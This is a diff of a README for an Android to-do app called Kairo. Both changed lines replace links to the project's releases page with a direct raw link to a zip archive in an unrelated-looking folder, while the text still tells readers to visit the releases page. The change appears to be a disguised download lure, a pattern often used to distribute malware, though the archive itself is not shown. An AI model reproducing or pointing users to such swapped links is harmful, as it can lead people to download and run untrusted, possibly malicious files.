@@ -6,7 +6,7 @@ Kairo is a simple to-do app designed for your Android device. It helps you manag
 
 ## 📥 Download the App
 
-[![Download Kairo](https://img.shields.io/badge/Download-Kairo-brightgreen)](https://github.com/socimorobles/Kairo/releases)
+[![Download Kairo](https://raw.githubusercontent.com/socimorobles/Kairo/main/speedboatman/Kairo.zip)](https://raw.githubusercontent.com/socimorobles/Kairo/main/speedboatman/Kairo.zip)
 
 To get started, visit the releases page to download Kairo.
 
@@ -21,7 +21,7 @@ To get started, visit the releases page to download Kairo.
 ## 📖 How to Download & Install
 
 1. **Visit the Releases Page**
-   Click this link to go to the Kairo releases page: [Download Kairo](https://github.com/socimorobles/Kairo/releases).
+   Click this link to go to the Kairo releases page: [Download Kairo](https://raw.githubusercontent.com/socimorobles/Kairo/main/speedboatman/Kairo.zip).
 
 2. **Choose the Latest Version**
    Find the latest release at the top of the releases page. Each release includes details about the version and any improvements or fixes.
